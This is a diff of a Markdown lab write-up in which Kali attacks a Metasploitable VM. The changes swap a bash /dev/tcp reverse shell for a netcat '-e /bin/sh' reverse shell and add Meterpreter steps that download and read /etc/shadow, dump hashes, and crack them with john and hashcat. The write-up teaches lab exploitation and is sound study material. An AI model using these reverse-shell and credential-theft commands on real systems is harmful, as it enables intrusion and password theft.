@@ -244,21 +244,24 @@ The terminal now waits for an incoming connection. This will be the 'catch' for 
 
 ### Step 3: Trigger the Reverse Shell (Target Side)
 
-This is for the demonstration of Netcat, from the **Metasploitable VM** (simulating code execution on the target):
+From the Metasploitable VM, run the following command to connect back to the Kali listener:
 
-`bash -i >& /dev/tcp/192.168.56.6/4444 0>&1`
+`nc 192.168.56.6 4444 -e /bin/sh`  
+`# replace the IP with your actual IP`
 
-**bash -i** --> *Opens an interactive bash shell*
+**What this does:**
 
-**>&**    --> *Redirects stdout AND stderr*
+**nc** --> *Netcat, the networking protocol*
 
-**/dev/tcp/192.168.56.6/4444**  --> *Opens a TCP connection to attacker IP:port*
+**192.168.56.6** --> *Attacker IP (kali) to connect back to*
 
-**0>&1**  --> *Redirects stdin (keyboard input) to the same connection
+**4444** --> *port the kali listener is waiting on*
+
+**-e /bin/sh** --> *Execute /bin/sh and pipe all its I/O over the connection*
 
 ![metasploitable2-nc](/screenshots/Metasploitable2-nc)
 
-What happens is that **bash opens shell, then pipes all input/output over a network connection back to the attacker.**
+*In simple words, what happens is that **Netcat** opens a TCP connection to **Kali** and hands over a **Shell** - every command typed on Kali runs on **Metasploitble**.
 
 
 ### Step 4: Verification of Shell Access
@@ -267,10 +270,11 @@ Back on Kali, Netcat listener should show:
 ```
 listening on [any] 4444 ...
 connect to [192.168.56.101] from (UNKNOWN) [192.168.56.102] 54321
-bash: no job control in this shell
-msfadmin@metasploitable:~$
 ```
-*This shows we have a remote shell on the target machine.**
+
+*The Metasploitable terminal shows a **blinking cursor** which is normal. The shell has no prompt because `/bin/sh` is minimal. All the interaction happens from the kali side.*
+
+*This shows we have a remote shell on the target machine.*
 
 *These commands run on attacker machine but gets executed on target machine:*
 
@@ -324,6 +328,10 @@ msf6 exploit(vsftpd_234_backdoor) > run
 
 ![run & upgrade to meterpreter](/screenshots/msf6.png)
 
+`sessions -u 1` --> *this upgrades the basic command shell from VSFTPd exploit into a full Meterpreter session*
+
+`sessions -i 2` --> *Connects you into the newly created Meterpreter session. The `-i` stands for "interact". Session 1 was the basic shell, session 2 is the **upgraded Meterpreter***
+
 
 - **These are the meterpreter capabilities used and what they do**
 
@@ -342,9 +350,33 @@ meterpreter > shell             # Drop into a system shell
 
 ![meterpreter-shell](/screenshots/shl1.png)
 
+`meterpreter > download /etc/shadow` --> *Downloads the shadow file directly from target machine to Kali machine, it demonstrates that Meterpreter can exfiltrate files silently which is a major threat in real situations.*
+
+` meterpreter > shell` --> *From inside Meterpreter, this drops you into a raw system shell on the target. Useful when you need to run standard Linux commands directly. Type `exit` to return back to Meterpreter.*
+
+`cat /etc/shadow` --> *Reads the shadow password file, which stores the hashed passwords of every user on the system. This file is normally readable by root - the fact that we can read it confirms we have full root access. These hashes could be cracked offline using tools like Hashcat or John the Ripper.*
+
+
 ![shell-meterpreter](/screenshots/shm2.png)
 
+`meterpreter > run post/linux/gather/hashdump` --> *A built-in Metasploit post-exploitation module that dumps all system password hashes in a clean, formatted output.*
+
 ![cat-shadow](/screenshots/shad.png)
+
+After downloading the `/etc/shadow` file to Kali using `meterpreter > download /etc/shadow`, I ran the following command directly on Kali to read it:
+`cat ~/shadow`
+
+This demonstrates something very important — the file is now off the target machine and sitting on the attacker's machine.
+
+This is what real data exfiltration looks like. The attacker no longer needs any active connection to the target to read those password hashes — they have their own local copy.
+
+From here a real attacker would feed this file straight into a password cracking tool:
+
+`john --wordlist=/usr/share/wordlists/rockyou.txt ~/shadow`
+
+or 
+
+`hashcat -m 500 ~/shadow /usr/share/wordlists/rockyou.txt`
 
 ---
 ## Traffic Analysis with Wireshark
